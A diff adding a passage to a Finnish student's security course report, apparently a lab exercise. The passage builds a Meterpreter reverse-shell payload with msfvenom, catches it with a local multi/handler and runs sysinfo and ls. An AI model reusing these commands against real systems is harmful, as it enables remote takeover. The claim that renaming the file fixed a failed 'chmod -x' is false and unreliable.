@@ -311,10 +311,82 @@ Haittaohjelma ei saa olla automaattisesti leviävä. Msfvenom tekee tyypillisill
 Raporttiin riittävät pelkät komennot ja raportti haitakkeen tekemisestä, itse binääriä ei ole pakko laittaa verkkoon. Mikäli laitat binäärin verkkoon, pakkaa se salakirjoitettuun zip-pakettiin ja laita salasanaksi "infected". Latauslinkin yhteydessä on oltava selkeä varoitus siitä, että kyseessä on haittaohjelma (malware), jota ei tule ajaa tuotantokoneilla. Salasanan voit halutessasi kertoa varoitusten yhteydessä.
 Palvelimen päässä pitää olla reikä tulimuurissa. Reverse shell tarkoittaa, että palvelin on hyökkäyskoneella.
 
+Aloitin jälleen luomalla ensin kansion, jossa aion työskennellä. 
+
+```bash
+mkdir mfs
+```
+
+```bash
+cd mfs
+```
+
+![g1](https://github.com/user-attachments/assets/0f18dfec-994e-4201-add8-0d2708f8f839)
+
+Tämän jälkeen ajoin komennon, jolla voi luoda haittaohjelman [dokumentaation](https://www.offsec.com/metasploit-unleashed/msfvenom/) avulla. 
+
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8 -f elf -o malware.elf
+```
+
+![g2](https://github.com/user-attachments/assets/86710d46-8716-469f-bc3d-65741bf82ecd)
 
 
+Tehtävänannossa ei pyydetty ajamaan haittaohjelmaa, mutta halusin nähdä miten se toimii käytännössä. 
+
+Tämän jälkeen avasin toisesssa terminaalissa mfsconsolen, jotta voin asettaa sen kuuntelemaan. 
+
+```bash
+msfconsole
 ```
+
+![g3](https://github.com/user-attachments/assets/39002926-1add-4eba-8e50-1baf8cc888ef)
+
+Tämän jälkeen määrittelin mfsconsoleen mitä kuunnellaan alkuperäisen payloadin perusteella. 
+
+```bash
+use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 8
+exploit
 ```
+
+Tämän jälkeen palasin ensimmäiseen terminaaliin ajamaan luomani haittaohjelman, joka ennen sille pitää asettaa ensin execute oikeudet. 
+
+```bash
+chmod -x malware.elf
+```
+
+Tämä ei suostunut antamaan execute oikeuksia tiedostolle, joten kokeilin uudelleennimeämistä. 
+
+```bash
+mv malware.elf tainted.elf 
+```
+
+```bash
+./tainted.elf
+```
+
+Nyt näyttäisi suostuneen muuttaa oikeudet ja ajaa haittaohjelman. Palataan katsomaan mitä msfconsole näyttää. 
+
+![g4](https://github.com/user-attachments/assets/5c813163-4735-433e-969f-e61476799533)
+
+Yhteys koneeseen näyttäisi muodostuneen, joten sen jälkeen voitaisiin lähteä kohdekonetta käyttämään hyväksi. Kokeilin muutamaa komentoa testiksi. 
+
+```bash
+sysinfo
+```
+
+![g5](https://github.com/user-attachments/assets/b5b680d4-9fac-42a9-afd7-f15910254484)
+
+```bash
+ls
+```
+
+![g6](https://github.com/user-attachments/assets/9a3adfcb-7aa8-4d9e-be84-bdd5c8673723)
+
+Tämän avulla voitaisiin siis navigoida koneella, siepata koneelta haluttavat tiedot tai käskeä kohdekonetta tekemään haluttavat toimenpiteet. 
 
 <img src="
 " width="500"> <br/>
@@ -359,3 +431,7 @@ Tehtävät a, c.
 GitHub. s.a. openwall/john-samples/blob/main/PDF/pdf_samples/PDF-Example-Password.pdf    
 https://github.com/openwall/john-samples/blob/main/PDF/pdf_samples/PDF-Example-Password.pdf    
 Tehtävä e.    
+
+Offsec. s.a. MSFvenom.    
+https://www.offsec.com/metasploit-unleashed/msfvenom/    
+Tehtävä g.    
